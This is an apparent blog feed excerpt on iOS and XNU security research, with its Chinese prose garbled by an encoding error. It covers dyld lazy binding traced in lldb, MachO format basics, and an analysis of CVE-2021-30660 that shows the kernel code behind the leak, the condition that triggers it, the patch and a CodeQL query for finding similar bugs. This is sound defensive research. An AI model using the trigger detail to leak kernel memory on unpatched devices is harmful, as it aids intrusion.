class="number">48</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">"/private/var/tmp/main"</span>, arch = <span class="string">"arm64"</span></span><br></pre></td></tr></table></figure><h3 id="3-ImageLoaderMachO-getLazyBindingInfo"><a href="#3-ImageLoaderMachO-getLazyBindingInfo" class="headerlink" title="3. ImageLoaderMachO::getLazyBindingInfo"></a>3. ImageLoaderMachO::getLazyBindingInfo</h3><p>æ ¹æ®ä¸åŒçš„opcodeï¼Œèµ°ä¸åŒåˆ†æ”¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( lazyBindingInfoOffset &gt; (lazyInfoEnd-lazyInfoStart) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">bool</span> done = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span>* p = &amp;lazyInfoStart[lazyBindingInfoOffset];</span><br><span class="line">    <span class="keyword">while</span> ( !done &amp;&amp; (p &lt; lazyInfoEnd) ) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> immediate = *p &amp; BIND_IMMEDIATE_MASK;</span><br><span class="line">        <span class="keyword">uint8_t</span> opcode = *p &amp; BIND_OPCODE_MASK;</span><br><span class="line">        ++p;</span><br><span class="line">        <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>è·å–ç›®æ ‡ç¬¦å·ç›¸å…³çš„ä¿¡æ¯ :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œè·å–è¯¥ç¬¦å·çš„åœ°å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uintptr_t</span> address = segActualLoadAddress(segIndex) + segOffset;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dyldç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œå®ç°çš„å‡½æ•°æœ‰äº›å·®åˆ«ï¼Œä½†æ˜¯æœ¬è´¨æ˜¯ä¸€æ ·çš„</span></span><br><span class="line">(lldb) n</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5ee4</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">256</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5ee4</span> &lt;+<span class="number">256</span>&gt;: mov    x26, x0</span><br><span class="line">    <span class="number">0x100fe5ee8</span> &lt;+<span class="number">260</span>&gt;: mov    x0, x20</span><br><span class="line">    <span class="number">0x100fe5eec</span> &lt;+<span class="number">264</span>&gt;: bl     <span class="number">0x100fe1fb0</span>               ; ImageLoaderMachO::imageBaseAddress() <span class="keyword">const</span></span><br><span class="line">    <span class="number">0x100fe5ef0</span> &lt;+<span class="number">268</span>&gt;: mov    x1, x0</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = <span class="number">0x00000001d860e14c</span>  libsystem_c.dylib`<span class="built_in">printf</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç¬¦å·ç»‘å®šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = bindAt(context, <span class="keyword">this</span>, address, BIND_TYPE_POINTER, symbolName, <span class="number">0</span>, <span class="number">0</span>, libraryOrdinal,<span class="literal">NULL</span>, <span class="string">"lazy "</span>, patcher, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è°ƒè¯•ï¼š</span></span><br><span class="line">frame #<span class="number">0</span>: <span class="number">0x0000000100fe5f28</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">324</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5f28</span> &lt;+<span class="number">324</span>&gt;: bl     <span class="number">0x100fe0664</span>               ; ImageLoaderMachO::bindLocation(ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">char</span>, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">long</span>, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">char</span> <span class="keyword">const</span>*, ImageLoaderMachO::ExtraBindData*, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">    <span class="number">0x100fe5f2c</span> &lt;+<span class="number">328</span>&gt;: ldrb   w8, [sp, #<span class="number">0x27</span>]</span><br><span class="line">    <span class="number">0x100fe5f30</span> &lt;+<span class="number">332</span>&gt;: ldrb   w9, [x21, #<span class="number">0x139</span>]</span><br><span class="line">    <span class="number">0x100fe5f34</span> &lt;+<span class="number">336</span>&gt;: orr    w8, w8, w9</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = <span class="number">0x00000001010235e0</span>  dyld::gLinkContext</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = <span class="number">0x0000000100000000</span></span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = <span class="number">0x0000000100fb8020</span>  (<span class="keyword">void</span> *)<span class="number">0x0000000100fb7f98</span></span><br><span class="line">(lldb) re re x3</span><br><span class="line">      x3 = <span class="number">0x00000001d860e14c</span>  libsystem_c.dylib`<span class="built_in">printf</span></span><br><span class="line">(lldb) re re x4</span><br><span class="line">      x4 = <span class="number">0x0000000000000001</span></span><br><span class="line">(lldb) re re x5</span><br><span class="line">      x5 = <span class="number">0x0000000100fbc04e</span></span><br><span class="line">(lldb) re re x6</span><br><span class="line">      x6 = <span class="number">0x0000000000000000</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹å:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5f2c</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">328</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5f2c</span> &lt;+<span class="number">328</span>&gt;: ldrb   w8, [sp, #<span class="number">0x27</span>]</span><br><span class="line">    <span class="number">0x100fe5f30</span> &lt;+<span class="number">332</span>&gt;: ldrb   w9, [x21, #<span class="number">0x139</span>]</span><br><span class="line">    <span class="number">0x100fe5f34</span> &lt;+<span class="number">336</span>&gt;: orr    w8, w8, w9</span><br><span class="line">    <span class="number">0x100fe5f38</span> &lt;+<span class="number">340</span>&gt;: cbz    w8, <span class="number">0x100fe5e4c</span>           ; &lt;+<span class="number">104</span>&gt;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) x/gx <span class="number">0x0000000100fb8020</span></span><br><span class="line"><span class="number">0x100fb8020</span>: <span class="number">0x00000001d860e14c</span></span><br><span class="line">(lldb) <span class="built_in">image</span> lookup -va <span class="number">0x00000001d860e14c</span></span><br><span class="line">      Address: libsystem_c.dylib[<span class="number">0x00000001809a614c</span>] (libsystem_c.dylib.__TEXT.__text + <span class="number">263364</span>)</span><br><span class="line">      Summary: libsystem_c.dylib`<span class="built_in">printf</span></span><br><span class="line">       Module: file = <span class="string">"/Users/muhe/Library/Developer/Xcode/iOS DeviceSupport/12.2 (16E227)/Symbols/usr/lib/system/libsystem_c.dylib"</span>, arch = <span class="string">"arm64"</span></span><br><span class="line">       Symbol: id = &#123;<span class="number">0x00000617</span>&#125;, range = [<span class="number">0x00000001d860e14c</span><span class="number">-0x00000001d860e1a8</span>), name=<span class="string">"printf"</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¬¦å·åœ°å€å·²ç»è¢«å†™è¿‡å»äº†(0x0000000100fb8020)</p><p>è‡³æ­¤ï¼Œç¬¦å·ç»‘å®šè¿‡ç¨‹å®Œæˆã€‚</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»-é“¾æ¥ã€è£…è½½å’Œåº“ã€‹</p><p><a href="https://juejin.cn/post/6844903912147795982">https://juejin.cn/post/6844903912147795982</a></p><p><a href="https://juejin.cn/post/6844903922654511112#heading-10">https://juejin.cn/post/6844903922654511112#heading-10</a></p><p><a href="https://bbs.pediy.com/thread-263907.htm">https://bbs.pediy.com/thread-263907.htm</a></p><p><a href="https://iosre.com/t/ios-12-4-killed-9/15633">https://iosre.com/t/ios-12-4-killed-9/15633</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ENV&quot;&gt;&lt;a href=&quot;#ENV&quot; class=&quot;headerlink&quot; title=&quot;ENV&quot;&gt;&lt;/a&gt;ENV&lt;/h1&gt;&lt;p&gt;macos11.4 + iphone6 iOS 12.2&lt;/p&gt;</summary>
    
    
    
    <category term="iOS" scheme="https://o0xmuhe.github.io/categories/iOS/"/>
    
    
    <category term="RE" scheme="https://o0xmuhe.github.io/tags/RE/"/>
    
    <category term="iOS" scheme="https://o0xmuhe.github.io/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>ql query for CVE-2021-30660 XNU Kernel Memory Disclosure</title>
    <link href="https://o0xmuhe.github.io/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/"/>
    <id>https://o0xmuhe.github.io/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/</id>
    <published>2021-07-11T08:22:50.000Z</published>
    <updated>2021-07-11T08:29:13.743Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://alexplaskett.github.io/CVE-2021-30660/">CVE-2021-30660 - XNU Kernel Memory Disclosure</a></p><a id="more"></a><h1 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h1><p><code>msgsz</code> å¯æ§</p><p><code>msginfo.msgssz</code> æ˜¯ 8</p><p>å¦‚æœæ§åˆ¶<code> msgsz</code> ä¸æ˜¯ 8çš„ æ•´æ•°å€ï¼Œæ¯”å¦‚9ï¼Œå°±ä¼šå¯¼è‡´åœ¨ç¬¬äºŒæ¬¡å¾ªç¯çš„æ—¶å€™ leakå‡ºæ¥ 7å­—èŠ‚çš„å†…æ ¸æ•°æ®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">next = msghdr-&gt;msg_spot;</span><br><span class="line">    <span class="keyword">for</span> (len = <span class="number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;</span><br><span class="line">        <span class="keyword">size_t</span> tlen;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* compare input (size_t) value against restrict (int) value */</span></span><br><span class="line">        <span class="keyword">if</span> (msgsz &gt; (<span class="keyword">size_t</span>)msginfo.msgssz) &#123;</span><br><span class="line">            tlen = msginfo.msgssz;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tlen = msgsz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &lt;= <span class="number">-1</span>) &#123;</span><br><span class="line">            panic(<span class="string">"next too low #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &gt;= msginfo.msgseg) &#123;</span><br><span class="line">            panic(<span class="string">"next out of range #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        SYSV_MSG_SUBSYS_UNLOCK();</span><br><span class="line">        eval = copyout(&amp;msgpool[next * msginfo.msgssz],</span><br><span class="line">            user_msgp, tlen);</span><br><span class="line">        SYSV_MSG_SUBSYS_LOCK();</span><br><span class="line">        <span class="keyword">if</span> (eval != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MSG_DEBUG_OK</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error (%d) copying out message segment\\n"</span>,</span><br><span class="line">                eval);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            msg_freehdr(msghdr);</span><br><span class="line">            wakeup((<span class="keyword">caddr_t</span>)msqptr);</span><br><span class="line">            <span class="keyword">goto</span> msgrcvout;</span><br><span class="line">        &#125;</span><br><span class="line">        user_msgp = user_msgp + tlen;   <span class="comment">/* ptr math */</span></span><br><span class="line">        next = msgmaps[next].next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (len = <span class="number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;</span><br><span class="line">        <span class="keyword">size_t</span> tlen;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * copy the full segment, or less if we're at the end</span></span><br><span class="line"><span class="comment">         * of the message</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        tlen = MIN(msgsz - len, (<span class="keyword">size_t</span>)msginfo.msgssz);</span><br><span class="line">        <span class="keyword">if</span> (next &lt;= <span class="number">-1</span>) &#123;</span><br><span class="line">            panic(<span class="string">"next too low #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &gt;= msginfo.msgseg) &#123;</span><br><span class="line">            panic(<span class="string">"next out of range #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        SYSV_MSG_SUBSYS_UNLOCK();</span><br><span class="line">        eval = copyout(&amp;msgpool[next * msginfo.msgssz],</span><br><span class="line">            user_msgp, tlen);</span><br></pre></td></tr></table></figure><p>è¡¥ä¸ä¿è¯äº†ï¼Œåœ¨é8 æ•´æ•°å€çš„æ—¶å€™ï¼Œåªæ‹·è´å‰©ä½™çš„é•¿åº¦çš„æ•°æ®ã€‚</p><h1 id="CodeQL-query"><a href="#CodeQL-query" class="headerlink" title="CodeQL query"></a>CodeQL query</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">// å­˜åœ¨è¯¯æŠ¥ IOKit</span><br><span class="line">predicate isSYSCall(Function f) &#123;</span><br><span class="line">    exists(Macro m |</span><br><span class="line">        m.getName().toUpperCase().regexpMatch("SYS(.)*") and</span><br><span class="line">        m.getLocation().getFile().getBaseName() = "syscall.h" and </span><br><span class="line">        m.getName().indexOf(f.getName()) &gt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">syscall -&gt; copyout</span></span><br><span class="line"><span class="comment">source : syscall fucntion 's params</span></span><br><span class="line"><span class="comment">sink   : copyout 3rd param(size)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this = "taint size to copy size" &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists(LocalVariable lv, Function f |</span><br><span class="line">        isSYSCall(f) and</span><br><span class="line">        lv.getFunction() = f and</span><br><span class="line">        (</span><br><span class="line">            not source.asExpr().(Literal).isConstant()</span><br><span class="line">        ) and</span><br><span class="line">        lv.getAnAccess() = source.asExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc | </span><br><span class="line">            fc.getTarget().getName() = "copyout" and</span><br><span class="line">            fc.getArgument(2) = sink.asExpr()</span><br><span class="line">        )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">source</span>, <span class="string">" to "</span>, sink, <span class="string">" in "</span>, source.getNode().getFunction().getName()</span><br></pre></td></tr></table></figure><p>æœ‰è¯¯æŠ¥ï¼Œä½†æ˜¯å¤Ÿç”¨äº†ï¼Œæ›¿æ¢æˆcopyinï¼Œä¹Ÿå¯ä»¥çœ‹çœ‹å…¶ä»–çš„è°ƒç”¨è·¯å¾„ï¼Œä¸è¿‡ç¬”è€…æ²¡å‘ç°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿ : (</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>CVE-2021-30660 - XNU Kernel Memory Disclosure</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://alexplaskett.github.io/CVE-2021-30660/&quot;&gt;CVE-2021-30660 - XNU Kernel Memory Disclosure&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="XNU" scheme="https://o0xmuhe.github.io/categories/XNU/"/>
    
    
    <category term="XNU" scheme="https://o0xmuhe.github.io/tags/XNU/"/>
    
    <category term="CodeQL" scheme="https://o0xmuhe.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>iOS RE 4 beginners 1 - MachO &amp;&amp; class-dump</title>
    <link href="https://o0xmuhe.github.io/2021/07/11/iOS-RE-4-beginners-1/"/>
    <id>https://o0xmuhe.github.io/2021/07/11/iOS-RE-4-beginners-1/</id>
    <published>2021-07-11T06:48:13.000Z</published>
    <updated>2021-08-01T14:38:49.733Z</updated>
    
    <content type="html"><![CDATA[<h1 id="roadmap"><a href="#roadmap" class="headerlink" title="roadmap"></a>roadmap</h1><p>ä¹‹å‰åœ¨ <a href="https://iosre.com/">iosre</a>çœ‹åˆ°ä¸€å¼ æ¯”è¾ƒç³»ç»Ÿçš„iOSé€†å‘å­¦ä¹ è·¯çº¿å›¾ï¼Œå› ä¸ºæ¥è§¦è¿‡ä¸€æ®µæ—¶é—´macOSä¸ŠæœåŠ¡çš„æ¼æ´æŒ–æ˜ï¼Œæ‰€ä»¥å¯¹*OSå®‰å…¨è¿˜æ˜¯æŒºæœ‰å…´è¶£çš„ï¼Œä¹Ÿä¸€ç›´æƒ³ç³»ç»Ÿæ€§åœ°å­¦ä¹ ä¸‹iOSé€†å‘ï¼Œä¹‹å‰çš„ä¸€ç›´ä¸æˆä½“ç³»ï¼Œä¹Ÿå¾ˆé›¶ç¢ï¼Œæ­£å¥½å¯¹ç€è¿™ä¸ªå›¾é‡æ„ä¸‹çŸ¥è¯†ä½“ç³»ã€‚</p><span id="more"></span><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/ios_re.png" alt="ios_re"></p><h1 id="macho-file-format"><a href="#macho-file-format" class="headerlink" title="macho file format"></a>macho file format</h1><p>  ç±»ä¼¼Windows/Linuxå¹³å°é€†å‘å­¦ä¹ ï¼Œé¦–å…ˆè¦å­¦ä¹ æ­£å‘å¼€å‘çš„åŸºç¡€çŸ¥è¯†ï¼Œä»¥åŠæ¶‰åŠçš„æ–‡ä»¶æ ¼å¼(æŒ‡å¯æ‰§è¡Œæ–‡ä»¶)ï¼š</p><ul><li>Windows - PE</li><li>Linux - ELF</li><li>*OS - MachO</li></ul><p>æ ¹æ®roadmapä¸­çš„appåˆ†ææµç¨‹ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯â€œç ¸å£³â€œï¼Œå°±æ˜¯åœ¨æ ¹æ®æ–‡ä»¶æ ¼å¼åšæ–‡ç« ï¼Œå› ä¸ºmachoæ–‡ä»¶æ˜¯åŠ å¯†çš„ï¼Œè¢«åŠ è½½åˆ°å†…å­˜æ‰§è¡Œçš„æ—¶å€™æ‰ä¼šè§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬åšé™æ€åˆ†æï¼Œéœ€è¦æŠŠå†…å­˜ä¸­è§£å¯†ä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶dumpå‡ºæ¥ï¼Œå¹¶ä¿®å¤æ–‡ä»¶æ‰å¯ä»¥æ‹–å…¥hopper/IDAæ­£å¸¸åˆ†æã€‚</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/iosre1/macho_overview.png" alt="Untitled"></p><p>æˆ‘æ„Ÿè§‰è¿™äº›å¯æ‰§è¡Œæ–‡ä»¶å¤§åŒå°å¼‚çš„å‘³é“ï¼ŒåŸºæœ¬éƒ½æ˜¯æ–‡ä»¶å¤´+å„ç§èŠ‚åŒºã€‚ åœ¨macOSä¸Šä½ å¯ä»¥ä½¿ç”¨ï¼š</p><ul><li>MachOView</li><li>MachOExplorer</li></ul><p>æ¥æŸ¥çœ‹ä¸€ä¸ªmachoæ–‡ä»¶çš„ç»“æ„ï¼Œæ¨èå‰è€…ï¼Œåè€…ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ€»æ˜¯å¡å¡çš„ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å´©æºƒ :(</p><p> æ€»ä½“ä¸Šæ¥çœ‹ï¼Œmachoæ–‡ä»¶æ ¼å¼å¯ä»¥çœ‹åšï¼š</p><ul><li><p>Header</p></li><li><p>Load Commands</p><ul><li>LC_SEGMENT<ul><li>TEXT</li><li>DATA</li><li>LINKEDIT</li></ul></li><li>LC_CODESIGNATURE</li><li>LC_DYLD_INFO_ONLY</li><li>LC_XXXX_DYLIB</li></ul></li><li><p>Data</p><ul><li>Segment(1-n)</li></ul></li></ul><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>åªå…³æ³¨å‡ ä¸ªåŸºæœ¬å­—æ®µ</p><ul><li>magic number : è¡¨ç¤ºmachoçš„ç±»å‹ï¼ŒFAT, ARMv7,ARM64,x86_64<ul><li>FAT å°±æ˜¯ â€œèƒ–æ–‡ä»¶â€ï¼Œè¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶é‡ŒåŒ…å«äº†å¤šä¸ªæ¶æ„çš„MachOæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>lipo</code>åˆ†ç¦»</li></ul></li><li>CPU Type, CPU SubType : arch</li><li>Number of load commands : Load commandsçš„æ•°é‡</li><li>flagsï¼šè¡¨ç¤ºä¸€äº›æ ‡è¯†ä½ï¼Œæ¯”å¦‚æ˜¯å¦å¼€äº†PIEï¼Œchecksecå¯ä»¥ä»è¿™é‡Œè·å–ä¸€äº›ä¿¡æ¯ã€‚</li><li>reversedï¼š64ä½ä¿ç•™å­—æ®µ</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.09.41@2x.png" alt="CleanShot 2021-07-11 at 15.09.41@2x"></p><h2 id="Load-Commands"><a href="#Load-Commands" class="headerlink" title="Load Commands"></a>Load Commands</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.17.40@2x.png" alt="CleanShot 2021-07-11 at 15.17.40@2x"></p><p>å³å‘Šè¯‰æ“ä½œç³»ç»Ÿï¼Œè¯¥å¦‚ä½•åŠ è½½æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚</p><ul><li><strong>LC_SEGMENT_64</strong>ï¼šå®šä¹‰ä¸€ä¸ªæ®µï¼ŒåŠ è½½åè¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼ŒåŒ…æ‹¬é‡Œé¢çš„èŠ‚ã€‚ æ¯”å¦‚ä»£ç æ®µ æ•°æ®æ®µ :<ul><li>TEXT ä»£ç æ®µ</li><li>DATA æ•°æ®æ®µ</li></ul></li><li>LC_DYLD_INFO_ONLYï¼šè®°å½•äº†æœ‰å…³é“¾æ¥çš„é‡è¦ä¿¡æ¯ï¼ŒåŒ…æ‹¬åœ¨_LINKEDITä¸­åŠ¨æ€é“¾æ¥ ç›¸å…³ä¿¡æ¯çš„å…·ä½“åç§»å’Œå¤§å°ã€‚ONLYè¡¨ç¤ºè¿™ä¸ªåŠ è½½æŒ‡ä»¤æ˜¯ç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„ï¼Œå¦‚æœæ—§çš„ é“¾æ¥å™¨æ— 